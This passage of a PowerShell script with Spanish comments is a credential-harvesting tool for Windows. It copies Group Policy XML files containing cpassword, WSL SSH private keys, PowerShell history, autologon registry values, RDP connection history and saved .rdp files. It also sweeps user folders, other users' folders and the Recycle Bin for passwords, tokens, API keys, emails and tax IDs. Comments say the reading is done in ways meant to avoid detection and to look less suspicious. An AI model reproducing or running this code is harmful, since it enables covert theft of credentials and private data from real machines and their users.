                        $hasFiles = $true
                    }
                    
                    foreach ($file in $files) {
                        $relativePath = $file.FullName.Substring($path.Length).TrimStart('\')
                        $destPath = Join-Path $transcriptFolder $relativePath
                        $destDir = Split-Path -Path $destPath -Parent
                        
                        if (-not (Test-Path -Path $destDir -ErrorAction SilentlyContinue)) {
                            New-Item -ItemType Directory -Path $destDir -Force -ErrorAction SilentlyContinue | Out-Null
                        }
                        
                        Copy-FileSecure -Source $file.FullName -Destination $destPath -FolderKey $folderKey
                    }
                }
            }
        }
    }
    
    # 11. Buscar en AppCmd de IIS (si existe)
    $appcmdPath = "$env:SystemRoot\System32\inetsrv\appcmd.exe"
    
    if (Test-Path -Path $appcmdPath -ErrorAction SilentlyContinue) {
        $appcmdFolder = Join-Path $destFolder (Add-RandomSuffix "AppCmd")
        Ensure-Folder -FolderPath $destFolder -FolderKey $folderKey
        New-Item -ItemType Directory -Path $appcmdFolder -Force -ErrorAction SilentlyContinue | Out-Null
        
        try {
            $appcmdFile = Join-Path $appcmdFolder "appcmd_config.txt"
            Start-Process -FilePath $appcmdPath -ArgumentList "list apppool /text:*" -RedirectStandardOutput $appcmdFile -WindowStyle Hidden -Wait -ErrorAction SilentlyContinue
            
            if ((Test-Path -Path $appcmdFile) -and (Get-Item -Path $appcmdFile).Length -gt 0) {
                $hasFiles = $true
                Mark-FolderHasContent -FolderKey $folderKey
            }
        } catch {}
    }
    
    # 12. Group Policy Preference Files que pueden contener contraseñas
    $groupPolicyPath = "$env:SystemRoot\SYSVOL\sysvol"
    
    if (Test-Path -Path $groupPolicyPath -ErrorAction SilentlyContinue) {
        $gpFound = $false
        $gpFolder = Join-Path $destFolder (Add-RandomSuffix "GroupPolicy")
        
        try {
            $xmlFiles = Get-ChildItem -Path $groupPolicyPath -Recurse -Include "*.xml" -ErrorAction SilentlyContinue | Where-Object {
                try {
                    $content = Get-Content -Path $_.FullName -ErrorAction SilentlyContinue
                    $content -match "cpassword|password|credentials"
                }
                catch {
                    $false
                }
            }
            
            if ($xmlFiles -and $xmlFiles.Count -gt 0) {
                Ensure-Folder -FolderPath $destFolder -FolderKey $folderKey
                New-Item -ItemType Directory -Path $gpFolder -Force -ErrorAction SilentlyContinue | Out-Null
                $hasFiles = $true
                
                foreach ($file in $xmlFiles) {
                    $destPath = Join-Path $gpFolder $file.Name
                    Copy-FileSecure -Source $file.FullName -Destination $destPath -FolderKey $folderKey
                }
            }
        } catch {}
    }
    
    # 13. WSL Credentials si existen
    $wslPath = "$env:USERPROFILE\AppData\Local\Packages\"
    
    if (Test-Path -Path $wslPath -ErrorAction SilentlyContinue) {
        try {
            $wslDirs = Get-ChildItem -Path $wslPath -Directory -ErrorAction SilentlyContinue | Where-Object { 
                $_.Name -like "*Linux*" -or $_.Name -like "*Ubuntu*" -or $_.Name -like "*Debian*" -or $_.Name -like "*SUSE*"
            }
            
            if ($wslDirs -and $wslDirs.Count -gt 0) {
                $wslFound = $false
                $wslFolder = Join-Path $destFolder (Add-RandomSuffix "WSL")
                
                foreach ($dir in $wslDirs) {
                    $sshPath = Join-Path $dir.FullName "LocalState\rootfs\home\*\.ssh\"
                    $sshFiles = Get-ChildItem -Path $sshPath -Recurse -File -Include "id_*", "known_hosts", "config" -ErrorAction SilentlyContinue
                    
                    if ($sshFiles -and $sshFiles.Count -gt 0) {
                        if (-not $wslFound) {
                            Ensure-Folder -FolderPath $destFolder -FolderKey $folderKey
                            New-Item -ItemType Directory -Path $wslFolder -Force -ErrorAction SilentlyContinue | Out-Null
                            $wslFound = $true
                            $hasFiles = $true
                        }
                        
                        foreach ($file in $sshFiles) {
                            $username = $file.FullName -replace '.*rootfs\\home\\(.*?)\\.ssh\\.*', '$1'
                            $destDir = Join-Path $wslFolder $username
                            
                            if (-not (Test-Path -Path $destDir)) {
                                New-Item -ItemType Directory -Path $destDir -Force -ErrorAction SilentlyContinue | Out-Null
                            }
                            
                            $destPath = Join-Path $destDir $file.Name
                            Copy-FileSecure -Source $file.FullName -Destination $destPath -FolderKey $folderKey
                        }
                    }
                }
            }
        } catch {}
    }
}

# 6. CREDS DELICADAS
function Get-SysConf {
    # Usar carpeta con nombre genérico
    $confDir = Join-Path $pRes_v "SysConf"
    $confKey = "SysConf"
    
    # Verificar si existe información relevante
    $hasInfo = $false
    
    # 1. Obtener información del sistema de manera pasiva
    try {
        $sysInfoDir = Join-Path $confDir "Info"
        
        # Recolectar información básica sin acceder a recursos sensibles
        Ensure-Folder -FolderPath $confDir -FolderKey $confKey
        New-Item -ItemType Directory -Path $sysInfoDir -Force -ErrorAction SilentlyContinue | Out-Null
        $sysInfoFile = Join-Path $sysInfoDir "system_info.txt"
        
        # Usar comandos nativos menos sospechosos
        $output = "# Sistema Operativo`r`n"
        $output += (Get-CimInstance Win32_OperatingSystem | Select-Object Caption, Version, OSArchitecture | Out-String)
        $output += "`r`n# Nombre del equipo`r`n"
        $output += (Get-CimInstance Win32_ComputerSystem | Select-Object Name, Domain | Out-String)
        
        $output | Out-File -FilePath $sysInfoFile -ErrorAction SilentlyContinue
        $hasInfo = $true
        Mark-FolderHasContent -FolderKey $confKey
    } catch {}
    
    # 2. Recolectar historial usando técnicas alternativas
    try {
        $historyDir = Join-Path $confDir "CmdHistory"
        
        # Usar PowerShell para recolectar historial (evitar doskey)
        $historyFound = $false
        
        # PowerShell PSReadline history
        $psHistoryFiles = @(
            "$env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt",
            "$env:USERPROFILE\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt"
        )
        
        foreach ($histFile in $psHistoryFiles) {
            if (Test-Path -Path $histFile -ErrorAction SilentlyContinue) {
                if (-not $historyFound) {
                    Ensure-Folder -FolderPath $confDir -FolderKey $confKey
                    New-Item -ItemType Directory -Path $historyDir -Force -ErrorAction SilentlyContinue | Out-Null
                    $historyFound = $true
                }
                
                $destFile = Join-Path $historyDir "ps_history.txt"
                
                # Usar método de lectura alternativo
                try {
                    $content = ""
                    # Leer línea por línea para evitar detección
                    Get-Content -Path $histFile -ErrorAction SilentlyContinue | ForEach-Object {
                        $content += "$_`r`n"
                    }
                    $content | Out-File -FilePath $destFile -ErrorAction SilentlyContinue
                    $hasInfo = $true
                    Mark-FolderHasContent -FolderKey $confKey
                } catch {}
            }
        }
        
        # Obtener historial del registro RunMRU
        $runMRUPath = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU"
        
        if (Test-Path -Path $runMRUPath -ErrorAction SilentlyContinue) {
            try {
                $runMRUValues = Get-ItemProperty -Path $runMRUPath -ErrorAction SilentlyContinue
                
                if ($runMRUValues) {
                    if (-not $historyFound) {
                        Ensure-Folder -FolderPath $confDir -FolderKey $confKey
                        New-Item -ItemType Directory -Path $historyDir -Force -ErrorAction SilentlyContinue | Out-Null
                        $historyFound = $true
                    }
                    
                    $runMRUFile = Join-Path $historyDir "recent_commands.txt"
                    
                    # Extraer valores de manera más discreta
                    $output = "Recent Commands:`r`n"
                    foreach ($prop in $runMRUValues.PSObject.Properties) {
                        if ($prop.Name -match '^[a-z]$') {
                            $output += "$($prop.Name): $($prop.Value)`r`n"
                        }
                    }
                    
                    $output | Out-File -FilePath $runMRUFile -ErrorAction SilentlyContinue
                    $hasInfo = $true
                    Mark-FolderHasContent -FolderKey $confKey
                }
            } catch {}
        }
    } catch {}
    
    # 3. Información de autologon (menos intrusiva)
    try {
        $autoLoginDir = Join-Path $confDir "AutoLogin"
        
        # Verificar registro sin dumpear
        $autoLogonPath = "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon"
        
        if (Test-Path -Path $autoLogonPath -ErrorAction SilentlyContinue) {
            try {
                # Usar PowerShell nativo en lugar de reg.exe
                $autoLogonValues = Get-ItemProperty -Path $autoLogonPath -ErrorAction SilentlyContinue
                
                # Solo guardar si hay información relevante
                if ($autoLogonValues.DefaultUserName -or $autoLogonValues.AutoAdminLogon) {
                    Ensure-Folder -FolderPath $confDir -FolderKey $confKey
                    New-Item -ItemType Directory -Path $autoLoginDir -Force -ErrorAction SilentlyContinue | Out-Null
                    
                    $autoLogonFile = Join-Path $autoLoginDir "autologon_info.txt"
                    
                    # Extraer solo propiedades relevantes
                    $output = "Auto Logon Information:`r`n"
                    if ($autoLogonValues.DefaultUserName) { $output += "Username: $($autoLogonValues.DefaultUserName)`r`n" }
                    if ($autoLogonValues.AutoAdminLogon) { $output += "AutoAdminLogon: $($autoLogonValues.AutoAdminLogon)`r`n" }
                    if ($autoLogonValues.DefaultDomainName) { $output += "Domain: $($autoLogonValues.DefaultDomainName)`r`n" }
                    
                    $output | Out-File -FilePath $autoLogonFile -ErrorAction SilentlyContinue
                    $hasInfo = $true
                    Mark-FolderHasContent -FolderKey $confKey
                }
            } catch {}
        }
    } catch {}
    
    # 4. Información de red relevante
    try {
        $networkDir = Join-Path $confDir "Network"
        
        # Recolectar información de red que puede contener credenciales
        Ensure-Folder -FolderPath $confDir -FolderKey $confKey
        New-Item -ItemType Directory -Path $networkDir -Force -ErrorAction SilentlyContinue | Out-Null
        
        # Obtener información de conexiones RDP
        $rdpClientPath = "HKCU:\Software\Microsoft\Terminal Server Client\Servers"
        
        if (Test-Path -Path $rdpClientPath -ErrorAction SilentlyContinue) {
            try {
                $rdpServers = Get-ChildItem -Path $rdpClientPath -ErrorAction SilentlyContinue
                
                if ($rdpServers -and $rdpServers.Count -gt 0) {
                    $rdpFile = Join-Path $networkDir "rdp_connections.txt"
                    
                    $output = "RDP Connection History:`r`n"
                    foreach ($server in $rdpServers) {
                        $serverName = Split-Path -Path $server.PSPath -Leaf
                        $serverProps = Get-ItemProperty -Path $server.PSPath -ErrorAction SilentlyContinue
                        
                        $output += "Server: $serverName`r`n"
                        if ($serverProps.UsernameHint) { $output += "  Username: $($serverProps.UsernameHint)`r`n" }
                    }
                    
                    $output | Out-File -FilePath $rdpFile -ErrorAction SilentlyContinue
                    $hasInfo = $true
                    Mark-FolderHasContent -FolderKey $confKey
                }
            } catch {}
        }
        
        # Buscar archivos .rdp que podrían contener credenciales guardadas
        try {
            $rdpFiles = @()
            
            # Rutas comunes en inglés y español, más ubicaciones adicionales
            $locationsToSearch = @(
                # Rutas estándar de usuario (inglés)
                "$env:USERPROFILE\Documents",
                "$env:USERPROFILE\Desktop",
                "$env:USERPROFILE\Downloads",
                
                # Rutas estándar de usuario (español)
                "$env:USERPROFILE\Documentos",
                "$env:USERPROFILE\Escritorio",
                "$env:USERPROFILE\Descargas",
                
                # Rutas de archivos recientes
                "$env:APPDATA\Microsoft\Windows\Recent",
                
                # Documentos públicos (inglés y español)
                "$env:PUBLIC\Documents",
                "$env:PUBLIC\Documentos",
                "C:\Users\Public\Documents",
                "C:\Users\Public\Desktop",
                "C:\Usuarios\Public\Documentos",
                "C:\Usuarios\Público\Documentos",
                
                # Carpetas personalizadas comunes
                "$env:USERPROFILE\Connections",
                "$env:USERPROFILE\Conexiones",
                "$env:USERPROFILE\Remote",
                "$env:USERPROFILE\Remoto",
                "$env:USERPROFILE\RDP",
                "$env:USERPROFILE\Work",
                "$env:USERPROFILE\Trabajo",
                "$env:USERPROFILE\Projects",
                "$env:USERPROFILE\Proyectos",
                
                # OneDrive y otras nubes
                "$env:USERPROFILE\OneDrive",
                "$env:USERPROFILE\OneDrive\Documents",
                "$env:USERPROFILE\OneDrive\Documentos",
                "$env:USERPROFILE\OneDrive\Desktop",
                "$env:USERPROFILE\OneDrive\Escritorio",
                
                # Carpetas adicionales del sistema
                "$env:SystemDrive\Work",
                "$env:SystemDrive\Trabajo",
                "$env:SystemDrive\Projects",
                "$env:SystemDrive\Proyectos",
                "$env:SystemDrive\RDP",
                "$env:SystemDrive\Connections",
                "$env:SystemDrive\Conexiones"
            )
            
            # Buscar en todas las rutas
            foreach ($location in $locationsToSearch) {
                if (Test-Path -Path $location -ErrorAction SilentlyContinue) {
                    $rdpFiles += Get-ChildItem -Path $location -Filter "*.rdp" -Recurse -ErrorAction SilentlyContinue
                }
            }
            
            # Buscar en todas las unidades lógicas (incluidas unidades de red mapeadas)
            try {
                $drives = Get-PSDrive -PSProvider FileSystem -ErrorAction SilentlyContinue
                foreach ($drive in $drives) {
                    # Buscar en la raíz de cada unidad
                    $rdpRootFiles = Get-ChildItem -Path "$($drive.Root)" -Filter "*.rdp" -ErrorAction SilentlyContinue
                    if ($rdpRootFiles) {
                        $rdpFiles += $rdpRootFiles
                    }
                    
                    # Buscar en carpetas comunes de cada unidad
                    $driveFolders = @(
                        "$($drive.Root)RDP",
                        "$($drive.Root)Connections", 
                        "$($drive.Root)Conexiones",
                        "$($drive.Root)Remote",
                        "$($drive.Root)Remoto"
                    )
                    
                    foreach ($folder in $driveFolders) {
                        if (Test-Path -Path $folder -ErrorAction SilentlyContinue) {
                            $rdpFiles += Get-ChildItem -Path $folder -Filter "*.rdp" -Recurse -ErrorAction SilentlyContinue
                        }
                    }
                }
            } catch {}
            
            # Procesar los archivos encontrados
            if ($rdpFiles -and $rdpFiles.Count -gt 0) {
                $rdpSavedFile = Join-Path $networkDir "rdp_saved_files.txt"
                
                $output = "RDP Files with Potential Saved Credentials:`r`n"
                $output += "Total files found: $($rdpFiles.Count)`r`n`r`n"
                
                # Eliminar duplicados (en caso de que se hayan encontrado en múltiples búsquedas)
                $uniqueRdpFiles = $rdpFiles | Sort-Object FullName -Unique
                
                foreach ($file in $uniqueRdpFiles) {
                    $output += "File: $($file.FullName)`r`n"
                    
                    # Analizar el contenido para buscar indicadores de credenciales guardadas
                    $content = Get-Content -Path $file.FullName -ErrorAction SilentlyContinue
                    
                    # Buscar líneas específicas que indican credenciales guardadas
                    $hasPassword = $content | Where-Object { 
                        $_ -match "password" -or 
                        $_ -match "passwd" -or 
                        $_ -match "contraseña" -or
                        $_ -match "clave" -or
                        $_ -match "pwd"
                    }
                    
                    $hasUsername = $content | Where-Object { 
                        $_ -match "username" -or 
                        $_ -match "domain" -or 
                        $_ -match "usuario" -or
                        $_ -match "dominio" -or
                        $_ -match "user"
                    }
                    
                    if ($hasPassword) {
                        $output += "  Contains saved password: Yes`r`n"
                        
                        # Extraer líneas relevantes (sin revelar la contraseña completa)
                        foreach ($line in $hasPassword) {
                            # Mostrar que existe una contraseña pero ofuscarla por seguridad
                            if ($line -match "(password|passwd|contraseña|clave|pwd)") {
                                $output += "  Password field found: " + ($line -replace '=.*', '=********') + "`r`n"
                            }
                        }
                    }
                    
                    if ($hasUsername) {
                        $output += "  Contains username: Yes`r`n"
                        
                        # Extraer líneas de nombre de usuario
                        foreach ($line in $hasUsername) {
                            if ($line -match "(username|user|usuario)") {
                                $output += "  $line`r`n"
                            }
                            if ($line -match "(domain|dominio)") {
                                $output += "  $line`r`n"
                            }
                        }
                    }
                    
                    # Verificar configuración de autenticación
                    $authSetting = $content | Where-Object { 
                        $_ -match "authentication" -or 
                        $_ -match "autenticacion" -or
                        $_ -match "autentificacion"
                    }
                    
                    if ($authSetting) {
                        $output += "  Authentication setting: $authSetting`r`n"
                    }
                    
                    # Verificar configuración de servidor
                    $serverSetting = $content | Where-Object { 
                        $_ -match "full address" -or 
                        $_ -match "direccion completa" -or
                        $_ -match "server" -or
                        $_ -match "servidor"
                    }
                    
                    if ($serverSetting) {
                        foreach ($line in $serverSetting) {
                            $output += "  $line`r`n"
                        }
                    }
                    
                    $output += "`r`n"
                }
                
                $output | Out-File -FilePath $rdpSavedFile -ErrorAction SilentlyContinue
                $hasInfo = $true
                Mark-FolderHasContent -FolderKey $confKey
                
                # Copiar los archivos .rdp encontrados
                $rdpSavedDir = Join-Path $networkDir "RDP_Files"
                New-Item -ItemType Directory -Path $rdpSavedDir -Force -ErrorAction SilentlyContinue | Out-Null
                
                foreach ($file in $uniqueRdpFiles) {
                    $destFile = Join-Path $rdpSavedDir $file.Name
                    # Si hay nombres duplicados, agregar un sufijo
                    if (Test-Path -Path $destFile) {
                        $randomSuffix = -join ((65..90) + (97..122) | Get-Random -Count 3 | ForEach-Object {[char]$_})
                        $destFile = Join-Path $rdpSavedDir "$($file.BaseName)_$randomSuffix$($file.Extension)"
                    }
                    Copy-Item -Path $file.FullName -Destination $destFile -Force -ErrorAction SilentlyContinue
                }
            }
        } catch {}
        
        # Recolectar información de conexiones de red
        $netConnFile = Join-Path $networkDir "net_connections.txt"
        try {
            # Usar CIM en lugar de netstat
            $connections = Get-CimInstance Win32_NetworkConnection -ErrorAction SilentlyContinue
            
            if ($connections) {
                $output = "Network Connections:`r`n"
                $connections | ForEach-Object {
                    $output += "Path: $($_.RemotePath)`r`n"
                    $output += "  Username: $($_.UserName)`r`n"
                    $output += "  Status: $($_.Status)`r`n"
                    $output += "  LocalName: $($_.LocalName)`r`n`r`n"
                }
                
                $output | Out-File -FilePath $netConnFile -ErrorAction SilentlyContinue
                $hasInfo = $true
                Mark-FolderHasContent -FolderKey $confKey
            }
        } catch {}
    } catch {}
}

# 7. BÚSQUEDA DE CREDENCIALES EN ARCHIVOS
function Find-CredentialFiles {
    # Configuración de carpetas
    $credDir = Join-Path $pRes_v "ArchivosCredenciales"
    $folderKey = "ArchivosCredenciales"
    
    # Crear estructura
    Ensure-Folder -FolderPath $credDir -FolderKey $folderKey
    $resultsFile = Join-Path $credDir "credenciales_encontradas.txt"
    $statsFile = Join-Path $credDir "estadisticas_busqueda.txt"
    
    # Inicializar archivos
    "# CREDENCIALES ENCONTRADAS`r`n" | Out-File -FilePath $resultsFile -Force
    "Búsqueda iniciada: $(Get-Date)`r`n" | Out-File -FilePath $resultsFile -Append
    
    # Estadísticas
    $stats = @{
        TotalArchivos = 0
        ArchivosAnalizados = 0
        ArchivosSaltados = 0
        ArchivosConCredenciales = 0
        TotalCredencialesEncontradas = 0
        HoraInicio = Get-Date
    }

    # Obtener la carpeta actual para excluirla
    $currentDirectory = $PWD.Path
    "Carpeta actual (excluida de la búsqueda): $currentDirectory" | Out-File -FilePath $statsFile -Append
    
    # Patrones simplificados para búsqueda más efectiva
    $searchTerms = @(
        # Términos generales de contraseñas
        "contraseña", "clave", "password", "passwd", "secreto", "pwd", "pass",
        # API y tokens
        "api_key", "token", "api_token", "secret_key", 
        # Bases de datos
        "connection_string", "conexion", "conn_string", "database_url",
        # Específicos
        "aws_key", "azure_key", "mercadopago", "afip", 
        "certificado", "privada", "publica",
        # Credenciales
        "credencial", "credential", "login"
    )
    
    # Extensiones a buscar
    $extensionsToSearch = @(
        ".txt", ".log", ".ini", ".cfg", ".conf", ".config", ".xml", ".json", ".yaml", ".yml",
        ".ps1", ".bat", ".cmd", ".sh", ".py", ".js", ".vbs",
        ".html", ".htm", ".csv", ".md", ".rtf",
        ".doc", ".docx", ".xls", ".xlsx", ".ppt", ".pptx",
        ".env", ".properties", ".cnf", ".inf", ".sql"
    )
    
    # Ubicaciones a buscar
    $locationsToSearch = @(
        # Carpetas principales del usuario actual
        "$env:USERPROFILE\Documents", "$env:USERPROFILE\Documentos",
        "$env:USERPROFILE\Desktop", "$env:USERPROFILE\Escritorio",
        "$env:USERPROFILE\Downloads", "$env:USERPROFILE\Descargas",
        
        # Desarrollo
        "$env:USERPROFILE\Projects", "$env:USERPROFILE\Proyectos",
        "$env:USERPROFILE\source", "$env:USERPROFILE\src",
        "$env:USERPROFILE\git", "$env:USERPROFILE\desarrollo",
        
        # OneDrive
        "$env:USERPROFILE\OneDrive",
        
        # Configuración
        "$env:USERPROFILE\.ssh",
        "$env:USERPROFILE\.aws",
        "$env:USERPROFILE\.azure",
        "$env:USERPROFILE\.config",
        
        # Startup de usuario actual
        "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup",
        "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\AutoStart",
        
        # Otras ubicaciones comunes
        "$env:APPDATA\Microsoft\UserSecrets",
        "$env:LOCALAPPDATA\Microsoft\UserSecrets"
    )
    
    # Añadir carpetas no estándar de C:\ 
    # Nota: Ya no excluimos $Recycle.Bin
    $systemFolders = @("Windows", "Program Files", "Program Files (x86)", "ProgramData", 
                       "Users", "Boot", "Recovery", "System Volume Information")
    
    try {
        $cDrive = Get-ChildItem -Path "C:\" -Directory -ErrorAction SilentlyContinue
        foreach ($folder in $cDrive) {
            # No incluir la carpeta actual ni carpetas del sistema
            if ($folder.FullName -ne $currentDirectory -and $folder.Name -notin $systemFolders) {
                $locationsToSearch += $folder.FullName
                "Agregando carpeta no estándar para búsqueda: $($folder.FullName)" | Out-File -FilePath $statsFile -Append
            }
        }
    } catch {
        "Error al enumerar carpetas en C:\: $_" | Out-File -FilePath $statsFile -Append
    }
    
    # Buscar en la papelera de reciclaje
    try {
        $recycleBinPath = "C:\`$Recycle.Bin"
        if (Test-Path -Path $recycleBinPath -ErrorAction SilentlyContinue) {
            "Analizando Papelera de reciclaje: $recycleBinPath" | Out-File -FilePath $statsFile -Append
            $locationsToSearch += $recycleBinPath
        }
    } catch {
        "Error al acceder a la Papelera de reciclaje: $_" | Out-File -FilePath $statsFile -Append
    }
    
    # Buscar en carpetas de otros usuarios
    try {
        $usersFolder = "C:\Users"
        $currentUserName = [System.Environment]::UserName
        
        $userFolders = Get-ChildItem -Path $usersFolder -Directory -ErrorAction SilentlyContinue | 
                      Where-Object { $_.Name -ne $currentUserName -and $_.Name -ne "Public" -and $_.Name -ne "Default" -and $_.Name -ne "Default User" -and $_.Name -ne "All Users" }
        
        foreach ($userFolder in $userFolders) {
            try {
                # Verificar si tenemos acceso a la carpeta del usuario
                $testAccess = Get-ChildItem -Path $userFolder.FullName -ErrorAction SilentlyContinue
                
                if ($testAccess -ne $null) {
                    "Usuario con acceso: $($userFolder.Name)" | Out-File -FilePath $statsFile -Append
                    
                    # Agregar carpetas principales, omitiendo AppData y Roaming
                    $otherUserLocations = @(
                        # Carpetas principales
                        "$($userFolder.FullName)\Documents", "$($userFolder.FullName)\Documentos",
                        "$($userFolder.FullName)\Desktop", "$($userFolder.FullName)\Escritorio",
                        "$($userFolder.FullName)\Downloads", "$($userFolder.FullName)\Descargas",
                        "$($userFolder.FullName)\OneDrive",
                        
                        # Configuración
                        "$($userFolder.FullName)\.ssh",
                        "$($userFolder.FullName)\.aws",
                        "$($userFolder.FullName)\.azure",
                        
                        # Startup (parte de AppData/Roaming que sí queremos incluir)
                        "$($userFolder.FullName)\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup"
                    )
                    
                    # Agregar todas las carpetas a las que tengamos acceso
                    foreach ($location in $otherUserLocations) {
                        if (Test-Path -Path $location -ErrorAction SilentlyContinue) {
                            $locationsToSearch += $location
                            "Agregando carpeta de otro usuario: $location" | Out-File -FilePath $statsFile -Append
                        }
                    }
                }
            } catch {
                "Sin acceso a: $($userFolder.FullName) - $_" | Out-File -FilePath $statsFile -Append
            }
        }
    } catch {
        "Error al enumerar usuarios: $_" | Out-File -FilePath $statsFile -Append
    }
    
    # Filtrar la carpeta actual de las ubicaciones a buscar
    $filteredLocations = $locationsToSearch | Where-Object { 
        $location = $_
        # Excluir si es la carpeta actual o si es una subcarpeta de la carpeta actual
        -not ($location -eq $currentDirectory -or $location.StartsWith("$currentDirectory\"))
    }
    
    "Total de ubicaciones a buscar (después de filtrar): $($filteredLocations.Count)" | Out-File -FilePath $statsFile -Append
    
    # Recolectar archivos
    $allFiles = @()
    foreach ($location in $filteredLocations) {
        if (Test-Path -Path $location -ErrorAction SilentlyContinue) {
            try {
                # Usar un enfoque más simple y directo
                $extensionFilter = $extensionsToSearch | ForEach-Object { "*$_" }
                $files = Get-ChildItem -Path $location -Include $extensionFilter -File -Recurse -ErrorAction SilentlyContinue | 
                         Where-Object { 
                             # Verificación adicional para excluir archivos en la carpeta actual
                             -not $_.FullName.StartsWith($currentDirectory) -and
                             # Verificar que no es parte de AppData o Roaming (excepto startup)
                             -not ($_.FullName -match '\\AppData\\' -and 
                                  $_.FullName -notmatch '\\Startup\\' -and 
                                  $_.FullName -notmatch '\\Start Menu\\Programs\\Startup\\')
                         }
                
                if ($files -and $files.Count -gt 0) {
                    $allFiles += $files
                    "Encontrados $($files.Count) archivos en $location" | Out-File -FilePath $statsFile -Append
                }
            } catch {
                "Error al buscar en $location : $_" | Out-File -FilePath $statsFile -Append
            }
        }
    }
    
    # Eliminar duplicados
    $uniqueFiles = $allFiles | Sort-Object FullName -Unique
    $stats.TotalArchivos = $uniqueFiles.Count
    "Total de archivos únicos encontrados: $($stats.TotalArchivos)" | Out-File -FilePath $statsFile -Append
    
    # Procesar cada archivo
    foreach ($file in $uniqueFiles) {
        try {
            $filePath = $file.FullName
            
            # Verificación extra para no procesar archivos en la carpeta actual
            if ($filePath.StartsWith($currentDirectory)) {
                "Omitiendo archivo en carpeta actual: $filePath" | Out-File -FilePath $statsFile -Append
                continue
            }
            
            $fileSize = $file.Length
            
            # Saltear archivos muy grandes
            if ($fileSize -gt 1GB) {
                $stats.ArchivosSaltados++
                continue
            }
            
            $stats.ArchivosAnalizados++
            
            # Obtener permisos
            $acl = Get-Acl -Path $filePath -ErrorAction SilentlyContinue
            $permisos = "N/A"
            if ($acl) {
                $permisos = "Propietario: $($acl.Owner)"
            }
            
            # Formato de tamaño legible
            $sizeStr = "{0:N2} KB" -f ($fileSize / 1KB)
            if ($fileSize -gt 1MB) {
                $sizeStr = "{0:N2} MB" -f ($fileSize / 1MB)
            }
            
            # Leer contenido
            $content = $null
            try {
                # Lectura directa para archivos pequeños
                if ($fileSize -lt 10MB) {
                    $content = Get-Content -Path $filePath -Raw -ErrorAction Stop
                } else {
                    # Para archivos grandes, leer línea por línea
                    $contentLines = Get-Content -Path $filePath -ErrorAction Stop
                    $content = $contentLines -join "`n"
                }
            } catch {
                "Error al leer $filePath : $_" | Out-File -FilePath $statsFile -Append
                continue
            }
            
            if ([string]::IsNullOrEmpty($content)) {
                continue
            }
            
            $foundMatch = $false
            
            # Búsqueda directa de términos
            foreach ($term in $searchTerms) {
                if ($content -match $term) {
                    if (-not $foundMatch) {
                        # Primera coincidencia en este archivo
                        "`r`n==================================================`r`n" | Out-File -FilePath $resultsFile -Append
                        "$filePath - $sizeStr - $permisos`r`n" | Out-File -FilePath $resultsFile -Append
                        $foundMatch = $true
                        $stats.ArchivosConCredenciales++
                    }
                    
                    # Buscar líneas que contienen el término
                    $lines = $content -split "`n"
                    $matchedLines = $lines | Where-Object { $_ -match $term }
                    
                    foreach ($line in $matchedLines) {
                        $cleanLine = $line.Trim()
                        if (-not [string]::IsNullOrWhiteSpace($cleanLine)) {
                            "palabra encontrada: $term" | Out-File -FilePath $resultsFile -Append
                            "Resultado: $cleanLine`r`n" | Out-File -FilePath $resultsFile -Append
                            $stats.TotalCredencialesEncontradas++
                        }
                    }
                }
            }
            
            # Buscar patrones adicionales
            $emailPattern = '[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}'
            $ipPattern = '\b\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}\b'
            $cuitPattern = '\b(20|23|27|30|33)[\- ]?\d{8}[\- ]?\d\b'
            
            if ($content -match $emailPattern -or $content -match $ipPattern -or $content -match $cuitPattern) {
                if (-not $foundMatch) {
                    "`r`n==================================================`r`n" | Out-File -FilePath $resultsFile -Append
                    "$filePath - $sizeStr - $permisos`r`n" | Out-File -FilePath $resultsFile -Append
                    $foundMatch = $true
                    $stats.ArchivosConCredenciales++
                }
                
                # Correos
                if ($content -match $emailPattern) {
                    $emailMatches = [regex]::Matches($content, $emailPattern)
                    $uniqueEmails = @{}
                    
                    foreach ($match in $emailMatches) {
                        $email = $match.Value
                        if (-not $uniqueEmails.ContainsKey($email)) {
                            $uniqueEmails[$email] = $true
                            "palabra encontrada: correo_electronico" | Out-File -FilePath $resultsFile -Append
                            "Resultado: $email`r`n" | Out-File -FilePath $resultsFile -Append
                            $stats.TotalCredencialesEncontradas++
                        }
                    }
                }
                
                # IPs
                if ($content -match $ipPattern) {
                    $ipMatches = [regex]::Matches($content, $ipPattern)
                    $uniqueIPs = @{}
                    
                    foreach ($match in $ipMatches) {
                        $ip = $match.Value
                        if (-not $uniqueIPs.ContainsKey($ip)) {
                            $uniqueIPs[$ip] = $true
                            "palabra encontrada: direccion_ip" | Out-File -FilePath $resultsFile -Append
                            "Resultado: $ip`r`n" | Out-File -FilePath $resultsFile -Append
                            $stats.TotalCredencialesEncontradas++
                        }
                    }
                }
                
                # CUITs
                if ($content -match $cuitPattern) {
                    $cuitMatches = [regex]::Matches($content, $cuitPattern)
                    $uniqueCuits = @{}
                    
                    foreach ($match in $cuitMatches) {
                        $cuit = $match.Value
                        if (-not $uniqueCuits.ContainsKey($cuit)) {
                            $uniqueCuits[$cuit] = $true
                            "palabra encontrada: cuit_cuil" | Out-File -FilePath $resultsFile -Append
                            "Resultado: $cuit`r`n" | Out-File -FilePath $resultsFile -Append
                            $stats.TotalCredencialesEncontradas++
                        }
                    }
                }
            }
        } catch {
            "Error procesando archivo $($file.FullName): $_" | Out-File -FilePath $statsFile -Append
        }
    }
    
    # Estadísticas finales
    $stats.HoraFin = Get-Date
    $stats.TiempoTotal = ($stats.HoraFin - $stats.HoraInicio).TotalSeconds
    
    "`r`n# ESTADÍSTICAS DE BÚSQUEDA`r`n" | Out-File -FilePath $statsFile -Append
    "Iniciado: $($stats.HoraInicio)`r`n" | Out-File -FilePath $statsFile -Append
    "Finalizado: $($stats.HoraFin)`r`n" | Out-File -FilePath $statsFile -Append
    "Tiempo total: $($stats.TiempoTotal) segundos`r`n" | Out-File -FilePath $statsFile -Append
    "Archivos encontrados: $($stats.TotalArchivos)" | Out-File -FilePath $statsFile -Append
    "Archivos analizados: $($stats.ArchivosAnalizados)" | Out-File -FilePath $statsFile -Append
